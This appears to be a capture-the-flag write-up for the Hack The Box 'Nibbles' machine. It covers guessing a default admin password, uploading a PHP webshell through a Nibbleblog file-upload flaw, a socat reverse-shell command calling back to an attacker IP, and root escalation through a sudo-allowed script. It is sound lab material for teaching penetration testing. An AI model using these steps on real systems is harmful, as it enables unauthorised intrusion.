---
layout: single
title: Nibbles Writeup
date: '2019-12-18 17:10:00'
tags:
- hack-the-box
classes: wide
sidebar:
  - title: "Difficulty: Easy"
    image: /images/posts/2019-12-18-nibbles-writeup/valentine-nibbles.png
    text: "https://app.hackthebox.eu/machines/127"
typora-copy-images-to: ../images/posts/2019/${filename}/
---

## Enumeration

The usual Autorecon enumeration turned up ports 80 & 22 open. Taking a look at the webserver running on port 80 revealed a Hello World page but looking at the source showed an interesting comment:



![Screenshot-from-2019-12-18-10-53-06](C:\Users\ICart\Documents\home-git\achillean00.github.io\docs\images\posts\2019\2019-12-18-nibbles-writeup\Screenshot-from-2019-12-18-10-53-06-16283622337001.png)

Going to /nibbleblog we an see that it's running an instance of the [Nibbleblog](http://www.nibbleblog.com/) software.

A search on ExploitDB lists an file upload [vulnerability](https://www.exploit-db.com/exploits/38489) but we need a username and password. I spent a while hunting around before trying `admin/nibbles` which worked. I'm not a big fan of password guessing like this, but I guess it is realistic!

## Initial Exploitation

Following the PoC [here](http://blog.curesec.com/article/blog/NibbleBlog-403-Code-Execution-47.html) I first grabbed a PHP Webshell. I choose [php33r](https://www.fuzzysecurity.com/scripts/16.html) as I hadn't used it before and it looked pretty neat.

I uploaded the file as detailed and then visited the location and I indeed had a webshell on the server:

<figure class="kg-card kg-image-card"><img src="/content/images/2019/12/Screenshot-from-2019-12-18-11-02-14.png" class="kg-image"></figure>

I had a quick look around and it turned out to be easy to grab user.txt

<figure class="kg-card kg-image-card"><img src="/content/images/2019/12/Screenshot-from-2019-12-18-11-04-19.png" class="kg-image"></figure>
## Privilege Escalation

I noticed the `personal.zip` file in the home directory so I copied this to a location that was accessible from the web and downloaded it to my Kali box. Extracting it revealed the following structure, and monitor.sh seemed to be a system monitoring script, which wasn't a lot of use at the moment.

    personal
    └── stuff
        └── monitor.sh
    
    1 directory, 1 file

At this point I decided I wanted a proper shell rather than having to interact with the webshell. The webshell had the ability to upload files, so I uploaded my local copy of `socat` and did a `chmod u+x socat` at the remote end to make it exectuable.

I ran the listener on my Kali box with:

    socat file:`tty`,raw,echo=0 tcp-listen:4444  

and then used the webshell to run

    ./socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.14.4:4444  

This allowed me to catch a full tty enabled shell.

At this point I tried `sudo -l` but this seemed to hang. I went on and tried other things, before just being more patient and actually getting a response as a lookup for the box name was timing out.

This revealed that the nibbler account could run `/home/nibbler/personal/stuff/monitor.sh​` as root with no password. Creating a quick script with `/bin/bash -i` in it and then running with `sudo /home/nibbler/personal/stuff/monitor.sh` we get a root shell and can grab the flag `b6d745c0dfb6457c55591efc898ef88c`

